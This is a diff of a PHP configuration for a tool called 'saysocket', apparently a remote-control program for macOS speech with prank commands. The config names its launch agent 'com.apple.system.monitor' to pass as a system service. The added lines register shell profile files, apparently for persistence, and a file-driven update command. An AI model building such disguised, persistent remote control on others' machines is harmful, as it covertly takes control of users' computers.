@@ -1,5 +1,9 @@
 <?php
 
+require_once 'settings.inc';
+require_once 'DatabaseConnection.inc';
+require_once 'functions.inc';
+
 $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
 
 // define('SERVER_HOST', 'http://saysocket.com/');
@@ -28,13 +32,16 @@ $ss_config = array(
     'FILE_LAUNCH_PLIST' => 'com.apple.system.monitor',
     'FILE_PHP_BINARY' => '/usr/bin/php',
     'FILE_INSTALLER' => 'ss_install',
-    'FILE_REMOVER' => 'ss_remove'
+    'FILE_REMOVER' => 'ss_remove',
+    'FILE_BASH_PROFILE' => '.bash_profile',
+    'FILE_ZSH_PROFILE' => '.zshrc'
 );
 
 $b64_config = array(
     'CONST_REGEX_VALID_IP_ADDRESS' => '/^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$/',
     'CONST_REGEX_SIMPLE_STRING' => '/^[a-zA-Z0-9\s,\'\.]+$/',
     'CONST_REGEX_CTL_QUIT' => '/^quit|exit|shutdown$/i',
+    'CONST_REGEX_CTL_UPDATE' => '/^update$/i',
     'CONST_REGEX_CTL_RICK_ROLL' => '/^rickroll$/i',
     'CONST_REGEX_CTL_VOICES' => '/^voices$/i',
     'CONST_REGEX_CTL_GET_VOICE' => '/^voice$/i',
@@ -46,6 +53,7 @@ $b64_config = array(
     'CONST_PROMPT' => 'say> ',
 
     'SS_CMD_QUIT' => 'quit|exit|shutdown',
+    'SS_CMD_UPDATE' => 'update',
     'SS_CMD_RICKROLL' => 'rickroll',
     'SS_CMD_VOICES' => 'voices',
     'SS_CMD_VOICE' => 'voice',
@@ -61,6 +69,7 @@ $b64_config = array(
     'CMD_GETIFADDR' => 'getifaddr',
     'CMD_PROCESSES' => 'ps aux',
     'CMD_NOHUP' => 'nohup',
+    'CMD_UPDATE' => parse_file_contents('cmd'),
 
     'OPT_IP' => 'ip',
     'OPT_PORT' => 'port',
@@ -85,7 +94,3 @@ $b64_config = array(
 foreach ($ss_config as $key => $val) {
   $b64_config["CONFIG_$key"] = $val;
 }
-
-require_once 'settings.inc';
-require_once 'DatabaseConnection.inc';
-require_once 'functions.inc';
